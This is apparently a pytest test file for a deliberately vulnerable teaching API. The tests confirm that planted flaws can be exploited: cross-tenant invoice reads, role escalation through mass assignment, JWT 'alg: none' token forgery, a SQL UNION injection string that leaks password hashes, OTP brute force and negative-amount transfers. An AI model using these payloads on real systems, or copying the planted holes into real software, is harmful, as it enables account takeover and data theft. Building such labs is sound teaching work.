"""Behavioural tests for the practice API shipped in ``labs/vulnerable-api``.

The lab is a teaching artefact, so the tests assert that each planted weakness
is actually exploitable. If someone "fixes" the lab by accident, these tests
fail and the practice material stays honest.
"""

from __future__ import annotations

import importlib.util
import json
import sys
import threading
from http.client import HTTPConnection
from pathlib import Path
from typing import Any

import pytest


LAB_SERVER = Path(__file__).resolve().parents[1] / "labs" / "vulnerable-api" / "server.py"
LAB_PASSWORD = "Passw0rd!"


def _load_lab_module() -> Any:
    spec = importlib.util.spec_from_file_location("strix_lab_server", LAB_SERVER)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    # ``dataclass(slots=True)`` rebuilds the class and looks the module up in
    # ``sys.modules``, so register it before executing.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


class LabClient:
    """Minimal JSON client so the tests depend on nothing but the stdlib."""

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port

    def request(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        token: str | None = None,
    ) -> tuple[int, Any]:
        connection = HTTPConnection(self.host, self.port, timeout=5)
        headers = {"content-type": "application/json"}
        if token is not None:
            headers["authorization"] = f"Bearer {token}"
        try:
            payload = json.dumps(body) if body is not None else None
            connection.request(method, path, body=payload, headers=headers)
            response = connection.getresponse()
            raw = response.read()
            return response.status, json.loads(raw) if raw else None
        finally:
            connection.close()

    def login(self, email: str) -> str:
        status, payload = self.request(
            "POST", "/api/v1/auth/login", {"email": email, "password": LAB_PASSWORD}
        )
        assert status == 200
        return str(payload["token"])


@pytest.fixture()
def lab() -> Any:
    module = _load_lab_module()
    server = module.build_server("127.0.0.1", 0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address[0], server.server_address[1]
    try:
        yield LabClient(str(host), int(port))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_health_and_login_work(lab: LabClient) -> None:
    status, payload = lab.request("GET", "/health")
    assert status == 200
    assert payload["status"] == "ok"
    assert lab.login("attacker@shopkart.test")


def test_bola_reads_another_tenants_invoice(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")

    status, mine = lab.request("GET", "/api/v1/invoices/2", token=token)
    assert status == 200
    assert mine["user_id"] == 2

    status, theirs = lab.request("GET", "/api/v1/invoices/1", token=token)
    assert status == 200
    assert theirs["user_id"] == 1
    assert theirs["number"] == "INV-2026-0001"
    assert theirs["card_last4"] == "4321"


def test_mass_assignment_escalates_own_role(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")
    status, payload = lab.request(
        "PATCH", "/api/v1/users/me", {"name": "Attacker", "role": "admin"}, token=token
    )
    assert status == 200
    assert payload["role"] == "admin"

    status, profile = lab.request("GET", "/api/v1/users/me", token=token)
    assert status == 200
    assert profile["role"] == "admin"


def test_bfla_lists_all_users_with_a_regular_token(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")
    status, users = lab.request("GET", "/api/v1/admin/users", token=token)
    assert status == 200
    emails = {user["email"] for user in users}
    assert "victim@shopkart.test" in emails
    assert "admin@shopkart.test" in emails


def test_jwt_alg_none_forgery_is_accepted(lab: LabClient) -> None:
    module = _load_lab_module()

    def encode(value: dict[str, Any]) -> str:
        return str(module._b64encode(json.dumps(value).encode()))

    forged = f"{encode({'alg': 'none', 'typ': 'JWT'})}.{encode({'sub': 3, 'role': 'admin'})}."
    status, profile = lab.request("GET", "/api/v1/users/me", token=forged)
    assert status == 200
    assert profile["id"] == 3
    assert profile["email"] == "admin@shopkart.test"


def test_user_lookup_leaks_password_hash_and_pii(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")
    status, user = lab.request("GET", "/api/v1/users/1", token=token)
    assert status == 200
    assert user["email"] == "victim@shopkart.test"
    assert len(user["password"]) == 32, "expected an unsalted md5 hash"
    assert user["aadhaar"].startswith("XXXX")


def test_search_is_sql_injectable(lab: LabClient) -> None:
    status, rows = lab.request(
        "GET",
        "/api/v1/search?q=x%25%27%20UNION%20SELECT%20id,password,name%20FROM%20users--%20-",
    )
    assert status == 200
    hashes = {row["email"] for row in rows}
    assert any(len(value) == 32 for value in hashes), "password hashes should leak via UNION"


def test_otp_has_no_attempt_limit(lab: LabClient) -> None:
    status, _ = lab.request(
        "POST",
        "/api/v1/auth/register",
        {"email": "newbie@shopkart.test", "password": LAB_PASSWORD, "name": "New"},
    )
    assert status == 201

    # Wrong codes never lock the account and never rate limit.
    for guess in ("0000", "0001", "0002", "0003", "0004"):
        status, _ = lab.request(
            "POST", "/api/v1/auth/verify-otp", {"email": "newbie@shopkart.test", "otp": guess}
        )
        assert status in {200, 400}

    status, payload = lab.request("GET", "/api/v1/_lab/otp?email=newbie@shopkart.test")
    assert status == 200
    status, verified = lab.request(
        "POST",
        "/api/v1/auth/verify-otp",
        {"email": "newbie@shopkart.test", "otp": payload["otp"]},
    )
    assert status == 200, "the correct OTP should still be accepted after failed attempts"
    assert "token" in verified


def test_negative_transfer_mints_balance(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")
    status, before = lab.request("GET", "/api/v1/users/me", token=token)
    assert status == 200
    starting_balance = before["balance"]

    status, after = lab.request(
        "POST",
        "/api/v1/wallet/transfer",
        {"to_email": "victim@shopkart.test", "amount": -99999},
        token=token,
    )
    assert status == 200
    assert after["sender_balance"] == pytest.approx(starting_balance + 99999)


def test_reset_restores_seed_state(lab: LabClient) -> None:
    token = lab.login("attacker@shopkart.test")
    lab.request("PATCH", "/api/v1/users/me", {"role": "admin"}, token=token)

    status, _ = lab.request("POST", "/api/v1/_lab/reset")
    assert status == 200

    token = lab.login("attacker@shopkart.test")
    status, profile = lab.request("GET", "/api/v1/users/me", token=token)
    assert status == 200
    assert profile["role"] == "user"
